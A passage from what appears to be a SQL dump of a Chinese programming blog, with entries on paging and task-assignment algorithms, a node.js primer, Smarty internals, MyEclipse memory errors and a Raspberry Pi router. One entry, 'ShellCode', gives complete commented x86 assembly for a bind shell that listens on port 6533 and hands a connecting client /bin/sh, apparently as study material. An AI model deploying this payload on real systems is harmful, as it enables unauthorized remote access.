/>排序结果可能是：a b a a b k a a c d a y k<br />如果要每页显示5条，每页只显示同一网站的2条结果。其它的结果放到下一页。<br />如上例所示，前5条为 a b a a b，有3条来自网站a的结果，所以要把最后一个来自网站a的网页放入第二页，并把第六条结果k放入第一页。<br />问题是，如何设计一种方式，实现这种检查和调整？<br /><b>解决方案一：</b><br />首先统计每个网站出现的次数，如果大于2，则放入下一页，。。。<br />第一轮，前五个为：a b a a b，统计a有3个，b有2个，所以要把最后一个a放入下一页，将第6个网页k提出来，然后将a放入第6个的位置。<br />输出a b a b k, 剩余网站为 a a a c d a y k<br />第二轮，前一个为 a a a c d，发现a有3个，需要将a放入第6个，但第6个网页还是a，所以要放入第7个，并把第7个的y提出来，然后将第6个a放入第7个的位置，再将第三个a放入第6个的位置。<br />输出a a y c d,剩余网站为a a k<br />可以看出，这种方案极其繁琐。编程很难实现，可能还要用回溯递归之类的操作。<br />下面使用队列的思想完成这个操作。<br /><b>解决方案二：</b><br />做一个队列，然后从头开始，输出并计算每个网站的网页数，如果这个网站的网页数已经够两个，则将其它的加入队列。每页输出结束后，将队列加到剩余网站的开头。<br />同样用前面的数据a b a a b k a a c d a y k，<br />输出a b a，然后发现第4个网页也是a，而a已经出现2次了，则将第4个网页加入队列，继续输出 b k<br />第一次运行结束后，输出为a b a b k<br />队列为a<br />剩余网页为 a a c d a y k<br />将队列加入剩余网页的开头，然后清空队列，剩余网页变成a a a c d a y k<br />输出a a，再将下一个a加入队列，继续输出c d,再将下一个a加入队列，继续输出y<br />第二次运行结束后，输出为a a c d y<br />队列为a a <br />剩余网页为 k<br />将队列加入剩余网页头，然后清空队列，剩余网页变成a a k，结束。<br /><br /><b>任务分配</b><br />A可以完成类型为1或3的任务，B可以完成类型为2或3的任务。A一共可以完成x个任务，B一共可以完成y个任务。<br />现在有N个任务，按价值从高到低的顺序排列。如何给分配任务给A和B，使A和B完成的任务总价值最大。<br /><b>解决方案一：</b><br />创建三个队列，q1, q2, q3。<br />然后依次读入每个任务t。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 如果q1==x，读入下一个任务<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q2==y，读入下一个任务<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q2<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将t加入q3<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q1,q2和q3三个队列的任务总数等于x+y，退出循环，否则读入下一任务。<br />如果q3不为空，将q3的任务分配到q1和q2中，使q1的任务个数是x，q2的任务个数是y<br />这是贪心法的思想，可以证明这种方案得到的是最优解。',1,1,1,0,0,0,'分页一次网页搜索的结果可能包含来自不同网站的不同网页。例如，搜索Java关键字，可能搜到20条来自网站a的网页，和30条来自网站b的网页，还有40条来自其它网站的网页。排序结果可能是：a b a a b k a a c d a y k如果要每页显示5条，每页只显示同一网站的2条结果。其它的结果放到下一页。如上例所示，前5条为 a b a a b，有3条来自网站a的结果，所以要把最后一个来自网站a的网页放入第二页，并把第六条结果k放入第一页。问题是，如何设计一种方式，实现这种检查和调整？解决方案一：首先统计每个网站出现的次数，如果大于2，则放入下一页，。。。第一轮，前五个为：a b a a b，统计a有3个，b有2个，所以要把最后一个a放入下一页，将第6个网页k提出来，然后将a放入第6个的位置。输出a b a b k, 剩余网站为 a a a c d a y k第二轮，前一个为 a a a c d，发现a有3个，需要将a放入第6个，但第6个网页还是a，所以要放入第7个，并把第7个的y提出来，然后将第6个a放入第7个的位置，再将第三个a放入第6个的位置。输出a a y c d,剩余网站为a a k可以看出，这种方案极其繁琐。编程很难实现，可能还要用回溯递归之类的操作。下面使用队列的思想完成这个操作。解决方案二：做一个队列，然后从头开始，输出并计算每个网站的网页数，如果这个网站的网页数已经够两个，则将其它的加入队列。每页输出结束后，将队列加到剩余网站的开头。同样用前面的数据a b a a b k a a c d a y k，输出a b a，然后发现第4个网页也是a，而a已经出现2次了，则将第4个网页加入队列，继续输出 b k第一次运行结束后，输出为a b a b k队列为a剩余网页为 a a c d a y k将队列加入剩余网页的开头，然后清空队列，剩余网页变成a a a c d a y k输出a a，再将下一个a加入队列，继续输出c d,再将下一个a加入队列，继续输出y第二次运行结束后，输出为a a c d y队列为a a 剩余网页为 k将队列加入剩余网页头，然后清空队列，剩余网页变成a a k，结束。任务分配A可以完成类型为1或3的任务，B可以完成类型为2或3的任务。A一共可以完成x个任务，B一共可以完成y个任务。现在有N个任务，按价值从高到低的顺序排列。如何给分配任务给A和B，使A和B完成的任务总价值最大。解决方案一：创建三个队列，q1, q2, q3。然后依次读入每个任务t。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 如果q1==x，读入下一个任务&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q2==y，读入下一个任务&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将t加入q3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q1,q2和q3三个队列的任务总数等于x+y，退出循环，否则读入下一任务。如果q3不为空，将q3的任务分配到q1和q2中，使q1的任务个数是x，q2的任务个数是y这是贪心法的思想，可以证明这种方案得到的是最优解。','',0,'develop',0,'','zinnia/_entry_detail.html','entry_detail.html'),(346,'[译]node.js入门','337319372010113194358698',2,'2010-12-31 22:27:53',NULL,'2010-12-31 22:27:53','2014-07-13 18:57:25','<b>简介：</b><br />Node的目标是提供一个简单的构建网络程序的方法。在下面的\"hello world\"例子中，很多客户端连接可以被并行地处理。Node告诉操作系统(通过epoll, kqueue, /dev/poll, 或select)在新连接创建时通知它，然后它进入睡眠状态。如果有新的连接，它就会执行回调函数。每个连接仅仅是一个很小的堆申请。<br /><br />Node的处理模型和现在常用的使用操作系统线程的并发模型不同。基于线程的网络相对效率低并且难以使用。与传统线程模型对每个新连接都要申请2M的线程堆栈相比，Node在高负载下表现出更好的内存效率。而且，Node用户不必关心进程死锁，因为Node里根本没有锁的概念。Node几乎没有直接执行IO操作的函数，进程也就永不阻塞，因为没有阻塞，即使不是专家也能编写快速的系统。<br />Node在设计上受Ruby的Event Machine和Python的Twisted影响并且和它们有些像。Node更注重事件模型，它将事件循环作为语言结构而不是类库。在其它的系统中，一般会有一个阻塞的调用来开始事件循环，在脚本的开始使用回调函数定义一个行为，然后在最后通过调用阻塞的调用(例如EventMachine::run())来启动服务。Node没有这样的启动事件循环的函数调用，它执行完输入脚本后自动进入事件循环，这有点像浏览器的JavaScript，事件循环对用户隐藏了。<br /><br />译注：一句话，node.js 是一种事件驱动地编写并发网络程序的脚本语言，语法与JavaScript相似。<br /><br /><b>下载源代码：</b><br />$ wget http://nodejs.org/dist/node-v0.2.6.tar.gz<br /><br /><b>编译安装：</b><br />$ tar xf node-v0.2.6.tar.gz<br />$ cd node-v0.2.6<br />$ ./configure<br />$ make<br />$ sudo make install<br /><br /><b>示例：<br />1. hello.js<br /></b>$ cat&gt; hello.js&lt;&lt;EOF<br />console.log(\"Hello, Node\")<br />EOF<br />$ node hello.js<br />Hello, Node<br /><b>2. httpserver.js</b><br />$ cat&gt; httpserver.js &lt;&lt;EOF<br />var http = require(\'http\');<br />http.createServer(function (req, res) {<br />&nbsp; res.writeHead(200, {\'Content-Type\': \'text/plain\'});<br />&nbsp; res.end(\'Hello World\\n\');<br />}).listen(8124, \"127.0.0.1\");<br />console.log(\'Server running at http://127.0.0.1:8124/\');<br />EOF<br />hankjin@jnfdaj:~/node$ node httpserver.js &amp;<br />hankjin@jnfdaj:~/node$ wget http://127.0.0.1:8124/<br />hankjin@jnfdaj:~/node$ cat index.html<br />Hello World<br /><b>3. tcpserver.js</b><br />hankjin@jnfdaj:~/node$ cat &gt; tcpserver.js &lt;&lt;EOF<span></span><span><br />var net = require(\'net\');<br />net.createServer(function (socket) {<br />&nbsp; socket.write(\"Echo server\\r\\n\");<br />&nbsp; socket.on(\"data\", function (data) {<br />&nbsp;&nbsp;&nbsp; socket.write(data);<br />&nbsp; });<br />}).listen(8124, \"127.0.0.1\");<br />EOF<br /></span>hankjin@jnfdaj:~/node$ node tcpserver.js &amp;<br />[1] 20031<br />hankjin@jnfdaj:~/node$ telnet 127.0.0.1 8124<br />Trying 127.0.0.1...<br />Connected to 127.0.0.1.<br />Escape character is \'^]\'.<br />Echo server<br />hello<br />hello<br />bye<br />bye',1,1,1,0,0,0,'简介：Node的目标是提供一个简单的构建网络程序的方法。在下面的\"hello world\"例子中，很多客户端连接可以被并行地处理。Node告诉操作系统(通过epoll, kqueue, /dev/poll, 或select)在新连接创建时通知它，然后它进入睡眠状态。如果有新的连接，它就会执行回调函数。每个连接仅仅是一个很小的堆申请。Node的处理模型和现在常用的使用操作系统线程的并发模型不同。基于线程的网络相对效率低并且难以使用。与传统线程模型对每个新连接都要申请2M的线程堆栈相比，Node在高负载下表现出更好的内存效率。而且，Node用户不必关心进程死锁，因为Node里根本没有锁的概念。Node几乎没有直接执行IO操作的函数，进程也就永不阻塞，因为没有阻塞，即使不是专家也能编写快速的系统。Node在设计上受Ruby的Event Machine和Python的Twisted影响并且和它们有些像。Node更注重事件模型，它将事件循环作为语言结构而不是类库。在其它的系统中，一般会有一个阻塞的调用来开始事件循环，在脚本的开始使用回调函数定义一个行为，然后在最后通过调用阻塞的调用(例如EventMachine::run())来启动服务。Node没有这样的启动事件循环的函数调用，它执行完输入脚本后自动进入事件循环，这有点像浏览器的JavaScript，事件循环对用户隐藏了。译注：一句话，node.js 是一种事件驱动地编写并发网络程序的脚本语言，语法与JavaScript相似。下载源代码：$ wget http://nodejs.org/dist/node-v0.2.6.tar.gz编译安装：$ tar xf node-v0.2.6.tar.gz$ cd node-v0.2.6$ ./configure$ make$ sudo make install示例：1. hello.js$ cat&gt; hello.js&lt;&lt;EOFconsole.log(\"Hello, Node\")EOF$ node hello.jsHello, Node2. httpserver.js$ cat&gt; httpserver.js &lt;&lt;EOFvar http = require(\'http\');http.createServer(function (req, res) {&nbsp; res.writeHead(200, {\'Content-Type\': \'text/plain\'});&nbsp; res.end(\'Hello World\\n\');}).listen(8124, \"127.0.0.1\");console.log(\'Server running at http://127.0.0.1:8124/\');EOFhankjin@jnfdaj:~/node$ node httpserver.js &amp;hankjin@jnfdaj:~/node$ wget http://127.0.0.1:8124/hankjin@jnfdaj:~/node$ cat index.htmlHello World3. tcpserver.jshankjin@jnfdaj:~/node$ cat &gt; tcpserver.js &lt;&lt;EOFvar net = require(\'net\');net.createServer(function (socket) {&nbsp; socket.write(\"Echo server\\r\\n\");&nbsp; socket.on(\"data\", function (data) {&nbsp;&nbsp;&nbsp; socket.write(data);&nbsp; });}).listen(8124, \"127.0.0.1\");EOFhankjin@jnfdaj:~/node$ node tcpserver.js &amp;[1] 20031hankjin@jnfdaj:~/node$ telnet 127.0.0.1 8124Trying 127.0.0.1...Connected to 127.0.0.1.Escape character is \'^]\'.Echo serverhellohellobyebye','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(347,'php模板Smarty源码一瞥','33731937200910591749241',2,'2009-11-05 21:17:49',NULL,'2009-11-05 21:17:49','2014-07-13 18:57:25','SmartydIt is extremely fast，Smarty的网站上如是说。<br />非常极其快，为什么那么快呢？忽悠吗？<br />还好Smarty的源代码不多，直接去看源代码，<br /><br />首先看Smarty.class.php，不停的按PageDown键，简直就是Smarty文档嘛，一直翻到1/2的时候，终于看到动真家伙的地方了，fetch，也是display的实现，预料之中，因为Smarty的使用也是一句display(\'xxx.tpl\')调用开始工作的。<br />开始看fetch函数，一个将近200行的大函数<br />function fetch($resource_name, $cache_id = null, $compile_id = null, $display = false)<br />简单点说：第一步：加载库，第二步：编译，第三步：缓存，第四步：输出[如果需要]<br />所以，编译是关键，一切都隐藏在编译中。<br /><br />打开Smarty_Compiler.class.php，这个就是传说中的Smarty编译器<br />首先是一大堆的正则表达式，然后是一堆函数，很熟悉的感觉了<br />先去templates_c下看看吧，编译好的模板文件%%12^129^1297CAF7%%i18n.tpl.php，打开看看就是标准的php文件了，项目开发完成以后，将compile_check选项关闭，全速运行，smarty就是一个代理的php文件<br />require xxxx.php<br />so，不由想到一个一句代码的python编辑器，就是这么简单<br />os.system(\"notepad \"+\" \".join(sys.argv))<br /><br />所以说，smarty的秘密就是Smarty.class.php 的 fetch() 函数，以及Smarty_Compiler.class.php。<br />SmartydIt is extremely fast，不余欺也。<br />唯一不解的是Smarty_Compiler为什么用正则表达式，而不用编译器的标准配置有限状态机呢？<br />',1,1,1,0,0,0,'SmartydIt is extremely fast，Smarty的网站上如是说。非常极其快，为什么那么快呢？忽悠吗？还好Smarty的源代码不多，直接去看源代码，首先看Smarty.class.php，不停的按PageDown键，简直就是Smarty文档嘛，一直翻到1/2的时候，终于看到动真家伙的地方了，fetch，也是display的实现，预料之中，因为Smarty的使用也是一句display(\'xxx.tpl\')调用开始工作的。开始看fetch函数，一个将近200行的大函数function fetch($resource_name, $cache_id = null, $compile_id = null, $display = false)简单点说：第一步：加载库，第二步：编译，第三步：缓存，第四步：输出[如果需要]所以，编译是关键，一切都隐藏在编译中。打开Smarty_Compiler.class.php，这个就是传说中的Smarty编译器首先是一大堆的正则表达式，然后是一堆函数，很熟悉的感觉了先去templates_c下看看吧，编译好的模板文件%%12^129^1297CAF7%%i18n.tpl.php，打开看看就是标准的php文件了，项目开发完成以后，将compile_check选项关闭，全速运行，smarty就是一个代理的php文件require xxxx.phpso，不由想到一个一句代码的python编辑器，就是这么简单os.system(\"notepad \"+\" \".join(sys.argv))所以说，smarty的秘密就是Smarty.class.php 的 fetch() 函数，以及Smarty_Compiler.class.php。SmartydIt is extremely fast，不余欺也。唯一不解的是Smarty_Compiler为什么用正则表达式，而不用编译器的标准配置有限状态机呢？','',0,'\"web skills\"',0,'','zinnia/_entry_detail.html','entry_detail.html'),(348,'ShellCode','3373193720100202489789',2,'2010-01-20 14:48:09',NULL,'2010-01-20 14:48:09','2014-07-13 18:57:25','Makefile:<br />binds: binds.o<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ld binds.o -o binds<br /><br />binds.o: binds.s<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as binds.s -o binds.o<br /><br />test: binds<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./binds &amp;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nc localhost 6533<br /><br /><br /># bindshell.s --bindport on 6533<br />.section .text<br />.global _start<br />_start:<br />#清空各寄存器<br />xor %eax,%eax<br />xor %ebx,%ebx<br />xor %ecx,%ecx<br />#socketcall(int call, unsigned long *args)<br />#al-&gt;66 bl-&gt;call cx-&gt;args<br /><br />#socket(2,1,0)创建一个TCP连接，注意字节序。<br />push %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第3个参数 0<br />push $0x1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第2个参数 1 SOCK_STREAM<br />push $0x2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第1个参数 2 AF_INET<br />mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将ECX里的数组地址作为socketcall系统调用的第2个参数<br />inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl＝0＋1,作为socketcall的第一个参数，调用socket函数<br />movb $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcall,0x66=102<br />int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br />mov %eax,%esi&nbsp;&nbsp;&nbsp;&nbsp; #将返回句柄保存在ESI中<br /><br />#bind(int sockfd, const struct sockaddr* addr, socklen_t addrlen)<br />push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈作为结束符<br />push $0x8519FF02&nbsp;&nbsp;&nbsp;&nbsp; #0x8519=6533,sin.family=02,FF任意字节填充<br />mov %esp,%ecx&nbsp;&nbsp;&nbsp; #将ESP地址赋值给ECX<br />push $0x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #开始bind的参数，0x10压栈 addrlen<br />push %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #保存地址 sockaddr*<br />push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #把前面的句柄压栈 sockfd<br />mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #继续把数组地址作为socketcall调用的第2个参数<br />inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=1+1=2=SYS_BIND<br />mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcall<br />int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br /><br />#listen(int sockfd, int backlog)<br />push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈，作为结束符 backlog<br />push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈，作为listen的参数 sockfd<br />mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组地址设为socketcall的第2个参数<br />mov $0x4,%bl&nbsp;&nbsp;&nbsp;&nbsp; #bl=4=SYS_LISTEN<br />mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行socketcall系统调用<br />int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br /><br />#accept(int sockfd, struct sockaddr* addr, socklen_t len)<br />push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 len<br />push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 addr<br />push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈 sockfd<br />mov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组设为系统调用第2个参数<br />inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=4+1=SYS_ACCEPT&nbsp;&nbsp; &nbsp;<br />mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行系统调用<br />int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br /><br />#dup2(int oldfd, int newfd)<br />mov %eax,%ebx&nbsp;&nbsp;&nbsp;&nbsp; #将accept返回的句柄复制到EBX sockfd<br />xor %ecx,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #清空 newfd-stdin<br />mov $0x3f,%al&nbsp;&nbsp;&nbsp;&nbsp; #dup2系统调用，0x3f=63<br />int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断<br />inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #1stdout<br />mov $0x3f,%al<br />int $0x80<br />inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #2stderr<br />mov $0x3f,%al<br />int $0x80<br /><br />#之前熟悉的execve调用，打开一个新的shell<br />#execve(char* fname, char* argv[], char *envp[])<br />push %edx<br />push $0x68732f2f<br />push $0x6e69622f<br />mov %esp,%ebx&nbsp;&nbsp; &nbsp;#fname<br />push %edx<br />push %ebx<br />mov %esp,%ecx&nbsp;&nbsp; &nbsp;#argv[0]=fname<br />mov $0xb,%al&nbsp;&nbsp; &nbsp;#11 execve<br />int $0x80 <br /><br />',1,1,1,0,0,0,'Makefile:binds: binds.o&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ld binds.o -o bindsbinds.o: binds.s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; as binds.s -o binds.otest: binds&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ./binds &amp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nc localhost 6533# bindshell.s --bindport on 6533.section .text.global _start_start:#清空各寄存器xor %eax,%eaxxor %ebx,%ebxxor %ecx,%ecx#socketcall(int call, unsigned long *args)#al-&gt;66 bl-&gt;call cx-&gt;args#socket(2,1,0)创建一个TCP连接，注意字节序。push %eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第3个参数 0push $0x1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第2个参数 1 SOCK_STREAMpush $0x2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #压入第1个参数 2 AF_INETmov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将ECX里的数组地址作为socketcall系统调用的第2个参数inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl＝0＋1,作为socketcall的第一个参数，调用socket函数movb $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcall,0x66=102int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断mov %eax,%esi&nbsp;&nbsp;&nbsp;&nbsp; #将返回句柄保存在ESI中#bind(int sockfd, const struct sockaddr* addr, socklen_t addrlen)push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈作为结束符push $0x8519FF02&nbsp;&nbsp;&nbsp;&nbsp; #0x8519=6533,sin.family=02,FF任意字节填充mov %esp,%ecx&nbsp;&nbsp;&nbsp; #将ESP地址赋值给ECXpush $0x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #开始bind的参数，0x10压栈 addrlenpush %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #保存地址 sockaddr*push %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #把前面的句柄压栈 sockfdmov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #继续把数组地址作为socketcall调用的第2个参数inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=1+1=2=SYS_BINDmov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #调用socketcallint $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断#listen(int sockfd, int backlog)push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #EDX压栈，作为结束符 backlogpush %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈，作为listen的参数 sockfdmov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组地址设为socketcall的第2个参数mov $0x4,%bl&nbsp;&nbsp;&nbsp;&nbsp; #bl=4=SYS_LISTENmov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行socketcall系统调用int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断#accept(int sockfd, struct sockaddr* addr, socklen_t len)push %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 lenpush %edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #参数0 addrpush %esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #句柄压栈 sockfdmov %esp,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #将数组设为系统调用第2个参数inc %bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #bl=4+1=SYS_ACCEPT&nbsp;&nbsp; &nbsp;mov $0x66,%al&nbsp;&nbsp;&nbsp;&nbsp; #执行系统调用int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断#dup2(int oldfd, int newfd)mov %eax,%ebx&nbsp;&nbsp;&nbsp;&nbsp; #将accept返回的句柄复制到EBX sockfdxor %ecx,%ecx&nbsp;&nbsp;&nbsp;&nbsp; #清空 newfd-stdinmov $0x3f,%al&nbsp;&nbsp;&nbsp;&nbsp; #dup2系统调用，0x3f=63int $0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #中断inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #1stdoutmov $0x3f,%alint $0x80inc %ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #2stderrmov $0x3f,%alint $0x80#之前熟悉的execve调用，打开一个新的shell#execve(char* fname, char* argv[], char *envp[])push %edxpush $0x68732f2fpush $0x6e69622fmov %esp,%ebx&nbsp;&nbsp; &nbsp;#fnamepush %edxpush %ebxmov %esp,%ecx&nbsp;&nbsp; &nbsp;#argv[0]=fnamemov $0xb,%al&nbsp;&nbsp; &nbsp;#11 execveint $0x80 ','',0,'unix',0,'','zinnia/_entry_detail.html','entry_detail.html'),(349,'MyEclipse内存不足PermGen space','33731937200931211332822',2,'2009-04-12 01:13:32',NULL,'2009-04-12 01:13:32','2014-07-13 18:57:25','&nbsp;&nbsp;&nbsp; 很郁闷的错误, 在自己512M内存的笔记本上运行MyEclipse, 听着声音都心疼, 而且鼠标操作稍快MyEclipse就停止响应, 用的那叫个心惊胆战, 打字速度都不敢往上提, 真憋屈.<br />&nbsp;&nbsp;&nbsp; 有人讲同样运行效果的笔记本和台式机, 笔记本的配置至少要比台式机高一倍. 诚哉斯言, 1G内存的台式机相当于我笔记本的4倍配置, 在1G内存的台式机上运行MyEclipse, 流畅了好多, 还可以同时运行Firefox, 可是, 两个小时后, PermGen space错误竟然出现了, 罪魁祸首应该是MyEclipse或Hibernate之一. 据说启动Eclipse时加-Xmax之类的参数效果会好一些, referenceing...<br />',1,1,1,0,0,0,'&nbsp;&nbsp;&nbsp; 很郁闷的错误, 在自己512M内存的笔记本上运行MyEclipse, 听着声音都心疼, 而且鼠标操作稍快MyEclipse就停止响应, 用的那叫个心惊胆战, 打字速度都不敢往上提, 真憋屈.&nbsp;&nbsp;&nbsp; 有人讲同样运行效果的笔记本和台式机, 笔记本的配置至少要比台式机高一倍. 诚哉斯言, 1G内存的台式机相当于我笔记本的4倍配置, 在1G内存的台式机上运行MyEclipse, 流畅了好多, 还可以同时运行Firefox, 可是, 两个小时后, PermGen space错误竟然出现了, 罪魁祸首应该是MyEclipse或Hibernate之一. 据说启动Eclipse时加-Xmax之类的参数效果会好一些, referenceing...','',0,'j2ee',0,'','zinnia/_entry_detail.html','entry_detail.html'),(350,'用树莓派做无线路由器共享拨号上网','337319372013102455232903',2,'2013-11-24 18:28:51',NULL,'2013-11-24 18:28:51','2014-07-13 18:57:26','1. 准备工作<div>1.1 硬件准备</div><div>树莓派：</div><div>HDMI转VGA接口：</div><div>USB键盘</div><div>液晶显示器</div><div>无线网卡：EP-8508GS</div><div>电脑（开发机，带Wifi）：Win7</div><div>读卡器：</div><div>拨号上网帐户与网线：</div><div>1.2 软件准备</div><div>写镜像工具 http://jaist.dl.sourceforge.net/project/win32diskimager/Archive/win32diskimager-v0.9-binary.zip</div><div>Xbian镜像&nbsp;<span style=\"line-height: 